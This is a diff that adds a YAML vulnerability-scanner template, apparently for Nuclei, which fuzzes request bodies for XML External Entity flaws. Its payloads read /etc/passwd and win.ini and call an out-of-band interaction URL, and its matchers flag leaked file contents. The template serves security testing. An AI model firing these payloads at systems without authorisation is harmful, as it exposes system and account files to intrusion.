@@ -1,0 +1,48 @@
+http:
+- fuzzing:
+  - fuzz:
+    - '{{xxe}}'
+    mode: single
+    part: body
+    type: replace
+  matchers:
+  - name: linux
+    part: body
+    regex:
+    - 'root:.*?:[0-9]*:[0-9]*:'
+    type: regex
+  - name: windows
+    part: body
+    type: word
+    words:
+    - for 16-bit app support
+  - part: interactsh_protocol
+    type: word
+    words:
+    - http
+  matchers-condition: or
+  payloads:
+    xxe:
+    - <!DOCTYPE {{rletter}} [ <!ENTITY {{rletter}} SYSTEM "file:///c:/windows/win.ini">
+      ]><x>&{{rletter}};</x>
+    - <!DOCTYPE {{rletter}} [ <!ENTITY {{rletter}} SYSTEM "file:////etc/passwd"> ]><x>&{{rletter}};</x>
+    - <!DOCTYPE {{rletter}} [ <!ENTITY {{rletter}} SYSTEM "http://{{interactsh-url}}">
+      ]><x>&{{rletter}};</x>
+  pre-condition:
+  - dsl:
+    - method == "POST"
+    - method == "PUT"
+    - method == "PATCH"
+    - method == "DELETE"
+    type: dsl
+  stop-at-first-match: true
+id: xxe-fuzzing-body
+info:
+  author: pwnhxl,AmirHossein Raeisi
+  name: Generic XML External Entity - (XXE)
+  reference:
+  - https://github.com/andresriancho/w3af/blob/master/w3af/plugins/audit/xxe.py
+  severity: medium
+  tags: fuzzing-req-xxe,fuzzing-req-body,xxe,dast,fuzzing-req-xxe-body
+variables:
+  rletter: '{{rand_base(6,''abc'')}}'
